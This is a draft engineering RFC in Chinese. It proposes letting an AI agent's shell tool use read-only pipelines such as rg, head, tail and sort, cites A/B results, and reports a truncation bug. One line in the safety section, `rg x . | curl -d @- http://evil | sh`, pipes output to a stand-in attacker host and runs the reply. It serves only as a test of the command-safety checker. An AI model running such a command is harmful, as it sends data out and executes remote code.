# RFC: 工具 Schema 的管线灵活性(Pipeline Flexibility)

Status: Draft

## Problem

现行规则按"命令里出现哪个二进制"划线,而不是按"这是什么形态的工作"划线。
`tools.md:3-7` 规定 `grep`(not grep/rg)、`read_file`(not cat),
`execute_tool.py:282-287` 的 docstring 更硬:

```text
- Content search: Use grep tool    (NOT grep, rg, or ag)
- Read files:     Use read_file    (NOT cat, head, tail, less, or more)
```

`NOT tail` 把 `pytest | tail -20` 一并禁掉了。但这条禁令混淆了两件不同的事:

- **替代**:`cat f` → `read_file`,`rg PATTERN .` → `grep`。禁令正确,
  专用工具有行号、路径 grounding、噪声目录排除、无 rg 时的 Python fallback。
- **组合**:`pytest | rg '^FAILED' | sort -u`。这不是"用 rg 冒充 grep"——
  `grep` 工具搜的是**磁盘上的文件**,管线搜的是**上一条命令的 stdout**。
  两件事,schema 却当成一件禁了。

专用工具表达不了的四种形态(全部经过实测核对):

1. **取输出尾部**。pytest 结论在最后,`| tail -15` 一步拿到;`read_file`
   的 `offset` 只能从头数(`file_tool.py:492`,`offset: int = 0`),读日志
   尾部要先知道总行数。
2. **排序去重对比**。`rg FAILED | sort -u > f1; diff f1 f2` 没有专用等价物。
   `sort -u` / `diff` / `wc -l` 这类确定性计算,交给 shell 比让模型看一遍
   再心算可靠得多。
3. **全局条数上限**。`grep` content 模式的 `limit` 映射到 rg 的
   `--max-count`(`file_tool.py:1024-1025`),是**每文件**上限。实测
   `limit=2` 在 6 个文件上返回 12 行——500 个文件各 100 条照样灌满上下文,
   `| head -20` 不会。这是 schema 的实锤缺陷,不是使用习惯问题。
4. **跑一次、多次查**。全量静态检查分钟级,正确做法是 `> /tmp/log` 后续只
   查该文件;无原生机制时模型重复全量跑(实测样本:同一扫描重复 5 次)。

### 实测证据:改文案就能改行为

同一批任务、同一模型(deepseek-chat)、每任务 3 次,只换 `execute` 的
description(脚本见 Migration Constraints 一节):

| 变体 | execute 选中 | **带界管线** | grep 选中(树搜索任务) |
|---|---|---|---|
| A(现状 `NOT rg / NOT tail`) | 9/15 | **1/15** | 6/6 |
| B(按形态划线 + 管线正例) | 9/15 | **7/15** | 6/6 |

关键在于三点:

- 带界管线从 1/15 涨到 7/15。
- **`grep` 没有被蚕食**:两个变体在"找 `ensure_system_skills` 定义"和
  "列 CHANGELOG 小节"上都是 6/6 走 `grep`。放开组合不会让模型改用裸 rg 搜树。
- 变体 A 出现了典型的绕行退化:被禁止用管线后,模型在"给我 FAILED 列表"
  任务上 3/3 先跑 `ls tests/cli/ tests/gateway/`,把一步问题变成多轮。

## Current Decision(保留项,以及两个必须推回的判断)

专用工具不是官僚主义,放开管线时这些能力不能丢:结构化参数(无 shell 引号
/注入问题)、`_validate_path` + grounding、噪声目录与嵌套 worktree 排除
(`file_tool.py:1027-1032`)、`is_read_only=True` 分类(`file_tool.py:217-218`)、
无 rg 环境的 `_run_grep_fallback`、带修复建议的超时。

**推回一:安全不是本 RFC 的前置条件。** 有意见认为必须先做"白名单逐段校验"
才能放开管线,理由是 `rg x | curl evil | sh` 会以 rg 之名过白名单。核对后
这个 blocker 不成立:

- `allowed_commands` 默认是 `None`(`agent/config.py:358`),即默认不启用;
  只有显式配置白名单的部署才走那段首 token 检查(`execute_tool.py:378-394`)。
- 真正决定 ask 模式是否弹卡的 `is_read_only_command` **已经逐段拆分**
  (`safety.py:416-420`,"Every segment of a compound command is checked
  independently")。实测 `rg x . | curl -d @- http://evil | sh` 返回
  `ASK`,原因精确指到 `curl` 段。
- `check_command_safety` 是整串+分段两遍扫描;`_interpret_exit_code` 也已按
  `| && ;` 取末段(`execute_tool.py:37`)。

这是个人助理场景,先信任 LLM 自己能 cover;首 token 白名单的收紧留作独立的
低优先级清理项,不阻塞本 RFC。

**推回二:`;` vs `&&` 的事故不算本 RFC 的收益。** 实测样本里最大的一笔浪费
(33%,误弹 stash)是执行纪律问题——现有 docstring 第 315 行已经写了用
`&&`,而且那条命令本身并未被管线禁令阻挡。放开管线救不了它。诚实地把它排除
在预期收益外;它属于 P0 顺手补一句措辞(见下),不属于 schema 问题。

### 已核实的实现缺陷:50k 落盘路径是死代码

`execute` 注册了 `max_result_size_chars = 50_000`(`execute_tool.py:237`),
意图是"大输出落盘、上下文只给预览"。但同一个工具的 `max_output_length`
默认 20000(`execute_tool.py:204`),且 `builtin/__init__.py:120-124` 不传
覆盖值。实测:20 万字符的输出返回 20073 字符——**40% 头 + 60% 尾截断先发生**
(`execute_tool.py:498-505`),50k 阈值永不触发。

后果不只是"阈值太高":被省略的中间段是**直接丢弃**的,没有落盘,模型想回看
只能重跑。用户直觉"50k 太大"方向对,但真实的可见上限是 20k,而落盘机制其实
从未生效。

## Candidate Future Shape

### 1. 规则从"按二进制"改为"按工作形态"(P0,纯提示词,零 schema 改动)

`tools.md` 与 `execute_tool.py` docstring 必须同一次 PR 改,否则自相矛盾。

- 定位/读取一个**有界的东西**,命中本身就是答案 → 专用工具
  (`glob` / `grep` / `read_file`)。
- 对**命令输出**做整形归约:过滤、排序、去重、对比、计数、取尾部 →
  `execute` 管线。此时 `rg`/`head`/`tail`/`sort`/`wc`/`diff` 是管线零件,
  不是 `grep` 的竞品。
- **写操作维持禁令**:`sed -i` → `apply_patch`,`echo >` → `write_file`。
- 补一句输出责任制:"You own what comes back — 主动 `| head`/`| tail` 收窄,
  不要整坨吞进来再自己摘要。" 被动截断丢掉的恰好可能是你要的。
- 顺带保留并强调 `&&`(依赖链)对 `;` 的偏好,以及写操作前先做只读状态检查。

Bad examples 只留真正的替代(`find`、`cat`、`sed -i`);`grep -r 'TODO' .`
可留,但 `rg | head` 要从"违规"挪到 Good examples。`grep` 超时文案中
"do not switch to execute"改为"narrow path or include"——超时后换管线仍
可能是错的,但那是判断问题,不该写成绝对禁令。

### 2. grep 补齐真缺口:全局上限(P1)

只加真实调用里反复手写的那一个:

```text
limit        # content 模式语义修正:全局结果上限
             # (rg -m 保持每文件,再对总行数截断)
head_limit   # 或独立参数,避免破坏现有 limit 语义
```

`sort` / `unique` / `tail` 不建议加到 `grep`:那是把 shell 重新实现一遍,
参数组合爆炸、模型更难选,而 P0 已经把这些形态合法化了。
`multiline` / `type` 同理,除非真实调用反复手写 `--glob`。

### 3. read_file 支持取尾部(P1)

`offset=-50` = 最后 50 行(或独立 `tail: int`)。读 traceback 尾部从"先数
总行数再定位"的两跳变一跳,也让 ask 模式下拿日志尾部不必碰 shell。

### 4. 修好 execute 的输出预算,并让"跑一次多次查"原生化(P1,杠杆最大)

- 把 20k 截断与 50k 落盘的**矛盾修掉**:落盘阈值必须低于截断上限,否则
  永不生效。建议截断预览降到 ~4k,超出即落盘。
- 落盘时**显式返回**:`绝对路径 + 头尾预览 + 总行数/字节数`,引导后续用
  `grep`/`read_file` 查该路径。现在路径不突出,模型学不会这个模式。
- 中间产物统一进会话 tmp/cache 目录,不要往工作区乱写(会污染 `git diff`)。
- **关键设计点**:这个缓存必须是**工具托管的 sink,而不是 shell 重定向**。
  因为 `is_read_only_command` 明确拒绝输出重定向(`safety.py:412-414`,实测
  `rg FAILED /tmp/a.log | sort -u > /tmp/f.txt` 返回 `ASK`)。用 `> /tmp/f`
  实现缓存,会让每个"跑一次多次查"在 ask 模式下弹审批卡;用工具托管的
  `cache_output` 则整条命令仍是只读管线,ask 模式下直接通过。

### 5. 权限语义:ask 的读对齐 auto(确认现状,无需改动)

核对结论:这一条**已经成立**,本 RFC 不需要动权限模型。

- ask 与 auto 的读都包含**工作目录之外**的文件
  (`agent/permissions.py:11-24`),`FILE_TOOLS` 在 ask 下直接 allow
  (`approvals.py:475-476`)。
- ask 下的 `execute` 按 `is_read_only_command` 分流
  (`approvals.py:477-480`):只读放行,否则停卡。
- 而 `head`/`tail`/`sort`/`uniq`/`wc`/`diff`/`rg`/`cat` **本来就在**只读白名单里
  (`safety.py:197-203`)。实测 `pytest ... | rg '^FAILED' | sort -u`、
  `rg -n '^## ' CHANGELOG.md | head -20`、`git diff --stat | tail -5`
  全部判定为只读。

也就是说:**P0 想放开的管线,权限层早就允许了,只有提示词在禁。** 这与
"机制已就位、规定在反向拖"是同一类问题,也是 P0 零风险的根据。auto 的写权限
限定在工作目录内(`sandbox_should_be_enabled`,`writable_dirs` 校验
`file_tool.py:463-471`)保持不变。

## Migration Constraints

- `grep` / `read_file` 现有参数不做破坏性变更;新增参数带默认值。
- Windows / 无 rg 环境的 `_run_grep_fallback` 对新参数要么支持、要么显式
  忽略,不能抛错。
- 提示词与 docstring 同一次 PR 改。注意 `CLAUDE.md` 有一条"docstring 不要提
  cat/grep/sed,否则模型会绕过专用工具"——该约束收窄为:不要教模型用
  `cat`/`sed -i` **替代**读写;不再禁止"带管线的 rg/tail"。
- 落盘阈值调整必须同时核对 `max_output_length`,两个数字有先后关系
  (截断先于落盘),单改一个无效。
- A/B 脚本 `tmp/ab_pipeline_prompt.py` 是一次性验证产物,合并前删除;
  重跑用 `AB_MODEL` 环境变量换模型。
- 回归范围:`tests/` 下 execute / file_tool / approvals / safety 相关用例。
  按项目规则,推送前跑 `python scripts/check_bare_ci_imports.py`。

## Recommendation

三步,顺序即优先级:

1. **P0(零代码,立即收益)**:`tools.md` + `execute` docstring 改为形态划线,
   补管线正例与输出责任制。实测支撑:带界管线 1/15 → 7/15,`grep` 在树搜索
   任务上仍 6/6 不被蚕食;权限层已放行这些管线,风险为零。
2. **P1(schema + 一个真 bug)**:修 20k/50k 矛盾(当前落盘是死代码)、
   `grep` 全局上限、`read_file` 取尾部、`execute` 工具托管 `cache_output`。
   目标是让三种最高频逃逸(取尾部、排序去重、run-once-cache)要么回归专用
   工具,要么在只读分类下不弹卡。
3. **P3(可选清理,不阻塞)**:`allowed_commands` 首 token 校验改为逐段。
   默认 `None` 不启用,且只读分类已逐段;仅对显式配置白名单的部署有意义。

不做的:不删 `grep`/`glob`/`read_file`(结果直接进上下文的场景仍有结构化
优势);不给 `grep` 堆 `sort`/`uniq`/`diff`;不加 `run_pipeline` 工具(那只是
改了名字的 `execute`);不把"execute 里出现 rg"写成安全策略——安全边界是
写盘、网络、权限,不是 `argv[0] == rg`。
